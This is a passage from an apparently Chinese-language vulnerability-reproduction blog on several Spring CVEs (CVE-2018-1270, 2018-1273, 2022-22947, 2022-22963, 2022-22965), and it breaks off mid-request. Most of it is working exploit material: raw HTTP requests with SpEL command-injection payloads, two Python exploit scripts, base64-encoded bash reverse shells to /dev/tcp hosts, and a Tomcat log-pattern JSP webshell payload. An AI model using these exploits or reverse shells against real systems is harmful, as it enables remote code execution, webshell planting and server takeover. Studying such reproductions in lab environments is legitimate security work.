zh-CN,zh;q=0.9</span><br><span class="line">If-None-Match: &quot;0&quot;</span><br><span class="line">If-Modified-Since: Wed, 22 May 2024 06:13:21 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json-patch+json</span><br><span class="line">Content-Length: 209</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,104,101,108,108,46,116,120,116&#125;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240522143442157.png" alt="image-20240522143442157"></p><p>反弹shell 的POC，可讲命令替换成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuNS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><h2 id="四、Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）"><a href="#四、Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）" class="headerlink" title="四、Spring Messaging 远程命令执行漏洞（CVE-2018-1270）"></a>四、Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</h2><h3 id="1、漏洞原因-3"><a href="#1、漏洞原因-3" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用<code>StandardEvaluationContext</code>解析，造成命令执行漏洞。</p><h3 id="2、影响版本-3"><a href="#2、影响版本-3" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Framework 5.0 到 5.0.4 </li><li>Spring Framework 4.3 到 4.3.14</li></ul><h3 id="3、漏洞复现-3"><a href="#3、漏洞复现-3" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Spring/image-20240523155822790.png" alt="image-20240523155822790"></p><p>2、上exp</p><p>创建<code>/tmp/1.txt</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import logging</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO)</span><br><span class="line"></span><br><span class="line">def random_str(length):</span><br><span class="line">    letters = string.ascii_lowercase + string.digits</span><br><span class="line">    return &#x27;&#x27;.join(random.choice(letters) for c in range(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SockJS(threading.Thread):</span><br><span class="line">    def __init__(self, url, *args, **kwargs):</span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.base = f&#x27;&#123;url&#125;/&#123;random.randint(0, 1000)&#125;/&#123;random_str(8)&#125;&#x27;</span><br><span class="line">        self.daemon = True</span><br><span class="line">        self.session = requests.session()</span><br><span class="line">        self.session.headers = &#123;</span><br><span class="line">            &#x27;Referer&#x27;: url,</span><br><span class="line">            &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        self.t = int(time.time()*1000)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        url = f&#x27;&#123;self.base&#125;/htmlfile?c=_jp.vulhub&#x27;</span><br><span class="line">        response = self.session.get(url, stream=True)</span><br><span class="line">        for line in response.iter_lines():</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">    </span><br><span class="line">    def send(self, command, headers, body=&#x27;&#x27;):</span><br><span class="line">        data = [command.upper(), &#x27;\n&#x27;]</span><br><span class="line"></span><br><span class="line">        data.append(&#x27;\n&#x27;.join([f&#x27;&#123;k&#125;:&#123;v&#125;&#x27; for k, v in headers.items()]))</span><br><span class="line">        </span><br><span class="line">        data.append(&#x27;\n\n&#x27;)</span><br><span class="line">        data.append(body)</span><br><span class="line">        data.append(&#x27;\x00&#x27;)</span><br><span class="line">        data = json.dumps([&#x27;&#x27;.join(data)])</span><br><span class="line"></span><br><span class="line">        response = self.session.post(f&#x27;&#123;self.base&#125;/xhr_send?t=&#123;self.t&#125;&#x27;, data=data)</span><br><span class="line">        if response.status_code != 204:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data error.&quot;)</span><br><span class="line">        else:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data success.&quot;)</span><br><span class="line"></span><br><span class="line">    def __del__(self):</span><br><span class="line">        self.session.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sockjs = SockJS(&#x27;http://your-ip:8080/gs-guide-websocket&#x27;)</span><br><span class="line">sockjs.start()</span><br><span class="line">time.sleep(1)</span><br><span class="line"></span><br><span class="line">sockjs.send(&#x27;connect&#x27;, &#123;</span><br><span class="line">    &#x27;accept-version&#x27;: &#x27;1.1,1.0&#x27;,</span><br><span class="line">    &#x27;heart-beat&#x27;: &#x27;10000,10000&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">sockjs.send(&#x27;subscribe&#x27;, &#123;</span><br><span class="line">    &#x27;selector&#x27;: &quot;T(java.lang.Runtime).getRuntime().exec(&#x27;touch /tmp/1.txt&#x27;)&quot;,</span><br><span class="line">    &#x27;id&#x27;: &#x27;sub-0&#x27;,</span><br><span class="line">    &#x27;destination&#x27;: &#x27;/topic/greetings&#x27;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">data = json.dumps(&#123;&#x27;name&#x27;: &#x27;vulhub&#x27;&#125;)</span><br><span class="line">sockjs.send(&#x27;send&#x27;, &#123;</span><br><span class="line">    &#x27;content-length&#x27;: len(data),</span><br><span class="line">    &#x27;destination&#x27;: &#x27;/app/hello&#x27;</span><br><span class="line">&#125;, data)</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523160413486.png" alt="image-20240523160413486"></p><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">from asyncio.constants import LOG_THRESHOLD_FOR_CONNLOST_WRITES</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import logging</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO)</span><br><span class="line"></span><br><span class="line">def random_str(length):</span><br><span class="line">    letters = string.ascii_lowercase + string.digits</span><br><span class="line">    return &#x27;&#x27;.join(random.choice(letters) for c in range(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SockJS(threading.Thread):</span><br><span class="line">    def __init__(self, url, *args, **kwargs):</span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.base = f&#x27;&#123;url&#125;/&#123;random.randint(0, 1000)&#125;/&#123;random_str(8)&#125;&#x27;</span><br><span class="line">        self.daemon = True</span><br><span class="line">        self.session = requests.session()</span><br><span class="line">        self.session.headers = &#123;</span><br><span class="line">            &#x27;Referer&#x27;: url,</span><br><span class="line">            &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        self.t = int(time.time()*1000)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        url = f&#x27;&#123;self.base&#125;/htmlfile?c=_jp.vulhub&#x27;</span><br><span class="line">        response = self.session.get(url, stream=True)</span><br><span class="line">        for line in response.iter_lines():</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">    </span><br><span class="line">    def send(self, command, headers, body=&#x27;&#x27;):</span><br><span class="line">        data = [command.upper(), &#x27;\n&#x27;]</span><br><span class="line"></span><br><span class="line">        data.append(&#x27;\n&#x27;.join([f&#x27;&#123;k&#125;:&#123;v&#125;&#x27; for k, v in headers.items()]))</span><br><span class="line">        </span><br><span class="line">        data.append(&#x27;\n\n&#x27;)</span><br><span class="line">        data.append(body)</span><br><span class="line">        data.append(&#x27;\x00&#x27;)</span><br><span class="line">        data = json.dumps([&#x27;&#x27;.join(data)])</span><br><span class="line"></span><br><span class="line">        response = self.session.post(f&#x27;&#123;self.base&#125;/xhr_send?t=&#123;self.t&#125;&#x27;, data=data)</span><br><span class="line">        if response.status_code != 204:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data error.&quot;)</span><br><span class="line">        else:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data success.&quot;)</span><br><span class="line"></span><br><span class="line">    def __del__(self):</span><br><span class="line">        self.session.close()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    sockjs = SockJS(url)</span><br><span class="line">    sockjs.start()</span><br><span class="line">    time.sleep(1)</span><br><span class="line"></span><br><span class="line">    sockjs.send(&#x27;connect&#x27;, &#123;</span><br><span class="line">        &#x27;accept-version&#x27;: &#x27;1.1,1.0&#x27;,</span><br><span class="line">        &#x27;heart-beat&#x27;: &#x27;10000,10000&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line">    sockjs.send(&#x27;subscribe&#x27;, &#123;</span><br><span class="line">        &#x27;selector&#x27;: &quot;T(java.lang.Runtime).getRuntime().exec(&#x27;bash -c &#123;echo,&quot; + command.decode(&#x27;utf-8&#x27;) + &quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;,</span><br><span class="line">        &#x27;id&#x27;: &#x27;sub-0&#x27;,</span><br><span class="line">        &#x27;destination&#x27;: subscribe_dest</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    data = json.dumps(&#123;&#x27;name&#x27;: &#x27;vulhub&#x27;&#125;)</span><br><span class="line">    sockjs.send(&#x27;send&#x27;, &#123;</span><br><span class="line">        &#x27;content-length&#x27;: len(data),</span><br><span class="line">        &#x27;destination&#x27;: send_dest</span><br><span class="line">    &#125;, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;http://1:8080/gs-guide-websocket&#x27;</span><br><span class="line">    subscribe_dest = &#x27;/topic/greetings&#x27;</span><br><span class="line">    send_dest = &#x27;/app/hello&#x27;</span><br><span class="line">    lhost = &#x27;127.0.0.1&#x27;</span><br><span class="line">    lport = &#x27;9999&#x27;</span><br><span class="line">    command = base64.b64encode(&#x27;bash -i &gt;&amp; /dev/tcp/&#123;&#125;/&#123;&#125; 0&gt;&amp;1&#x27;.format(lhost,lport).encode(&#x27;utf-8&#x27;))</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="五、Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）"><a href="#五、Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）" class="headerlink" title="五、Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）"></a>五、Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</h2><h3 id="1、漏洞原因-4"><a href="#1、漏洞原因-4" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p><h3 id="2、影响版本-4"><a href="#2、影响版本-4" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Data Commons 1.13 到 1.13.10 </li><li>Spring Data Commons 2.0 到 2.0.5</li></ul><h3 id="3、漏洞复现-4"><a href="#3、漏洞复现-4" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><img src="/img/VulnRep-Spring/image-20240523161850728.png" alt="image-20240523161850728" style="zoom:150%;" /><p>2、漏洞点注册页面<code>/users</code></p><p><img src="/img/VulnRep-Spring/image-20240523161933560.png" alt="image-20240523161933560"></p><p>3、漏洞复现</p><p>注册并抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/1.txt&quot;)]</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523162044363.png" alt="image-20240523162044363"></p><p>写入成功</p><p><img src="/img/VulnRep-Spring/image-20240523162203362.png" alt="image-20240523162203362"></p><h2 id="六、Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行（CVE-2022-22947）"><a href="#六、Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行（CVE-2022-22947）" class="headerlink" title="六、Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）"></a>六、Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）</h2><h3 id="1、漏洞原因-5"><a href="#1、漏洞原因-5" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p><h3 id="2、影响版本-5"><a href="#2、影响版本-5" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Cloud Gateway 3.1.x &lt; 3.1.1</li><li>Spring Cloud Gateway 3.0.x &lt; 3.0.7</li><li>旧的、不受支持的版本也会受到影响</li></ul><h3 id="3、漏洞复现-5"><a href="#3、漏洞复现-5" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><img src="/img/VulnRep-Spring/image-20240523165110802.png" alt="image-20240523165110802" style="zoom:150%;" /><p>2、添加一个恶意请求的路由。POST请求<code>/actuator/gateway/routes/pentest</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: xx.xx.xxx.xx:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like     Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;hacktest&quot;,</span><br><span class="line"> &quot;filters&quot;: [&#123;</span><br><span class="line">&quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">&quot;args&quot;: &#123;</span><br><span class="line">  &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">  &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523165722503.png" alt="image-20240523165722503"></p><p>3、刷新路由，触发表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: 192.168.32.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523165843602.png" alt="image-20240523165843602"></p><p>4、查看回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 192.168.32.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523171313927.png" alt="image-20240523171313927"></p><p>5、删除路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DELETE /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 192.168.32.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="七、Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）"><a href="#七、Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）" class="headerlink" title="七、Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）"></a>七、Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）</h2><h3 id="1、漏洞原因-6"><a href="#1、漏洞原因-6" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。</p><h3 id="2、影响版本-6"><a href="#2、影响版本-6" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</li></ul><h3 id="3、漏洞复现-6"><a href="#3、漏洞复现-6" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>post 请求<code>/functionRouter</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1687934495</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/1.txt&quot;)</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523180738617.png" alt="image-20240523180738617"></p><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: xx.xx.x.xx:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1687934495</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuNS85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="八、Spring框架Data-Binding与JDK-9-导致的远程代码执行漏洞（CVE-2022-22965）"><a href="#八、Spring框架Data-Binding与JDK-9-导致的远程代码执行漏洞（CVE-2022-22965）" class="headerlink" title="八、Spring框架Data Binding与JDK 9+导致的远程代码执行漏洞（CVE-2022-22965）"></a>八、Spring框架Data Binding与JDK 9+导致的远程代码执行漏洞（CVE-2022-22965）</h2><h3 id="1、漏洞原因-7"><a href="#1、漏洞原因-7" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>在JDK 9+上运行的Spring MVC或Spring WebFlux应用程序可能存在通过数据绑定执行远程代码（RCE）的漏洞。现在已知的利用方法要求应用程序以WAR部署的形式在Tomcat上运行。</p><p>然而，该漏洞的性质更为普遍，可能有其他方法可以利用它。可修改tomcat 日志存储路径与后缀，向日志中写入jsp</p><h3 id="2、影响版本-7"><a href="#2、影响版本-7" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><ul><li>Spring Framework 版本 5.3.0 到 5.3.17、5.2.0 到 5.2.19 以及更早的版本</li></ul><h3 id="3、漏洞复现-7"><a href="#3、漏洞复现-7" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><img src="/img/VulnRep-Spring/image-20240523193634539.png" alt="image-20240523193634539" style="zoom:150%;" /><p>2、添加参数：<code>name=admin&amp;age=123</code></p><img src="/img/VulnRep-Spring/image-20240523193724442.png" alt="image-20240523193724442" style="zoom:150%;" /><p>3、上poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</span><br><span class="line">Host: xx.x.x.x:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 